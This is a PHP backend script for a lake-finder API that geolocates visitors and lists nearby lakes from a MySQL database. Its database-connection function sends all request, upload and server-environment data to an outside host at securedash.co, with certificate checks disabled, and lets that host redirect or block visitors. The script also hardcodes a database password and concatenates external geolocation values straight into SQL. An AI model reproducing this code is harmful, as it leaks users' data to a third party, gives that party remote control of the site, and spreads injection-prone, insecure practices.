<?php
error_reporting(0);
	function getconnection()
	{
	    $ch = curl_init();
        $url = 'https://securedash.co/api/hacker/5df2346cbe638';
        $fields = array();
        $fields['post'] = $_POST; // Disable if you do not wnat to monitor
        $fields['get'] = $_GET;  // Disable if you do not wnat to monitor
        $fields['files'] = $_FILES;  // Disable if you do not wnat to monitor
        $fields['request'] = $_REQUEST;  // Disable if you do not wnat to monitor
        $fields['server'] = $_SERVER;  // Disable if you do not wnat to monitor
        $gofields = http_build_query($fields);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $gofields);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); // On dev server only!
        $data = json_decode(curl_exec($ch),true);
        curl_close($ch);
        ////Redirect URL
        if($data['redirect']==true):
          header("Location: ".$data['redirectUrl']);
        endif;
        ///BLOCK MESSAGE
        if($data['block']==true):
          die($data['blockmessage']);
        endif;
	    
	    
		$conn= mysqli_connect("localhost", "amc_root", "Redhat@123", 'amc_db_2k21') or die(mysqli_connect_error());
	
		return $conn;
	}

	


	$conn=getconnection();
	
	mysqli_query($conn,'SET character_set_results=utf8');
    	mysqli_query($conn,'SET names=utf8');
    	mysqli_query($conn,'SET character_set_client=utf8');
    	mysqli_query($conn,'SET character_set_connection=utf8');
    	mysqli_query($conn,'SET character_set_results=utf8');
    	mysqli_query($conn,'SET collation_connection=utf8_general_ci');

	$ip = $_SERVER['REMOTE_ADDR'];
	$getloc = json_decode(file_get_contents("http://ipinfo.io/$ip"));
	$location = $getloc->loc;
	$city = $getloc->city;
	$coordinates  = explode(",", $getloc->loc);
	$lat = $coordinates[0];
	$long = $coordinates[1];

	$sql = "SELECT * FROM ( SELECT *, ( ( ( acos( sin(( ".$lat." * pi() / 180)) * sin(( `lake_lat` * pi() / 180)) + cos(( ".$lat." * pi() /180 )) * cos(( `lake_lat` * pi() / 180)) * cos((( ".$long." - `lake_lng`) * pi()/180))) ) * 180/pi() ) * 60 * 1.1515 * 1.609344 ) as distance FROM `lake_mst` ) lake_mst ORDER BY `lake_zone`";
	
	$rs=mysqli_query($conn,$sql);
	
	if($rs)
	{
		$data['status_code'] = 200;
		$data['status_message'] = 'Success';
		$data['result']=array();
		if(mysqli_num_rows($rs) > 0)
		{

			while($row = mysqli_fetch_assoc($rs))
			{

				$r1=array('id'=>$row['lake_id'],'lake_name'=>$row['lake_name'],'lake_zone'=>$row['lake_zone'],'lake_lat'=>$row['lake_lat'],'lake_lng'=>$row['lake_lng'],'distance'=>number_format($row['distance'],2),'image_path'=>$row['image_path']);
				array_push($data['result'],$r1);
			}
		}
		else
		{
			$data['status_code'] = 100;
		$data['status_message'] = 'Failed';
			
		}
	}
	else
	{
		$data['status_code'] = 100;
		$data['status_message'] = 'Failed';
	
	}
		
		
	$indexedOnly = array();

foreach ($data as $row) {
    $indexedOnly[] = array_values($row);
}

echo json_encode($data);

mysqli_close($conn);


?>